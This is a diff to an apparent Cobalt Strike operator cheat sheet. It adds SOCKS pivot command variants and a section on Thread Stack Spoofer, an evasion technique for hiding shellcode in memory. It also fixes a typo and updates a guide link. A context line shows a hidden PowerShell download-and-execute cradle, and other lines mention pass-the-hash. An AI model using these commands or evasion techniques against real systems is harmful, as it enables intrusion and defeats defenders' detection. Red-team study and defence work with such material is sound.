@@ -38,6 +38,8 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Resource Kit](#resource-kit)
     * [Artifact Kit](#artifact-kit)
     * [Mimikatz Kit](#mimikatz-kit)
+    * [Sleep Mask Kit](#sleep-mask-kit)
+    * [Thread Stack Spoofer](#thread-stack-spoofer)
 * [Beacon Object Files](#beacon-object-files)
 * [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
 * [References](#references)
@@ -278,7 +280,7 @@ beacon > execute-assembly /home/audit/Rubeus.exe
 
 :warning: OPSEC Advice: Use the **spawnto** command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe 
 
-- **portscan:** Performs a portscan on a spesific target.
+- **portscan:** Performs a portscan on a specific target.
 - **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
 - **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \
 :exclamation: This module needs Administrator privileges.
@@ -335,6 +337,11 @@ Opsec safe Pass-the-Hash:
 ```powershell
 # Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.
 beacon > socks [PORT]
+beacon > socks [port]
+beacon > socks [port] [socks4]
+beacon > socks [port] [socks5]
+beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password]
+beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging]
 
 # Proxy browser traffic through a specified Internet Explorer process.
 beacon > browserpivot [pid] [x86|x64]
@@ -428,6 +435,11 @@ Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
 
 Use the included `build.sh` or `build.bat` script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.
 
+### Thread Stack Spoofer
+
+> An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.
+
+Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option `artifactkit_stack_spoof` in the config file `arsenal_kit.config`.
 
 ## Beacon Object Files
 
@@ -476,4 +488,4 @@ beacon> PortBender redirect 445 8445
 * [How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
 * [NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
 * [Cobalt Strike - User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)
-* [Cobalt Strike 4.5 - User Guide PDF](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf)
+* [Cobalt Strike 4.6 - User Guide PDF](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-6-user-guide.pdf)
